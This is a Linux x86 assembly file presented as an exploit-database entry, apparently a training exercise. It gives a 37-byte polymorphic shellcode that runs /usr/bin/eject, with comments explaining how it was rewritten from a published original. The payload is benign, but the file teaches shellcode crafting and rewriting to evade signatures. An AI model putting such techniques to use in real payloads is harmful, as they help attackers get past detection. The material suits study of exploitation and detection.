; Exploit Title: /usr/bin/eject (poly shellcode-621.php) Linux_x86 / 37 bytes
; Date: December 6th, 2018
; Exploit Author: Nelis
; Version: 0.1
; Tested on: Ubuntu 12.10
; Filename: cdreject.nasm
; SLAE-ID: 1327
; Based on: http://shell-storm.org/shellcode/files/shellcode-621.php (46 bytes)

; Shellcode: "\x31\xc0\xb0\x0b\x51\x68\x6a\x65\x63\x74\x68\x6e\x2f\x2f\x65\x68\x72\x2f\x62\x69\x68\x2f\x2f\x75\x73\x89\xe3\x51\x53\x89\xe1\xcd\x80\x04\x01\xcd\x80"



global _start			

section .text
_start:

	xor eax, eax		; *** added to zero eax
	mov al, 0xb          	; *** changed from push 0xb + pop eax. Put 0xb (=11 = execve syscall) on stack 
;	pop    eax           	; *** Put Oxb from stack in eax - removed
;	cdq                  	; *** clear edx register - removed, edx already 0x0
;	push   edx           	; *** put0 term on the stack - removed
;	push   0x6d          	; *** m - removed (man eject shows that cdrom is default value and can be omitted
;	push   0x6f726463    	; *** ordc - removed. See previous remark
;	mov    ecx,esp       	; *** Save pointer to esp into ecx (cdrom) - see previous remark
	push   ecx           	; *** Put 0 term on the stack - changed from: push edx, any zero reg will do
	push 0x7463656a  	; tcej
	push 0x652f2f6e     	; e/ni
	push 0x69622f72    	; b/re
	push 0x73752f2f     	; su//	
;	push word  0x7463       ; *** tc
;	push   0x656a652f    	; *** eje/
;	push   0x6e69622f    	; *** nib/
;	push   0x7273752f    	; *** rsu/ - changed /usr/bin/eject to //usr/bin//eject
	mov    ebx,esp       	; Save pointer to esp into ebx (//usr/bin//eject)
	push   ecx           	; *** Push zero on stack- changed from: push edx, any zero reg will do
;	push   ecx           	; *** Push addres to 'cdrom' string - removed, not needed with default device
	push   ebx           	; Push address to '/usr/bin/eject' string
	mov    ecx,esp       	; Configure ecx for the syscall
	int    0x80          	; syscall
	add al, 0x1	     	; *** set eax to 1 = exit, changed from inc eax
	int    0x80          	; syscall exit	
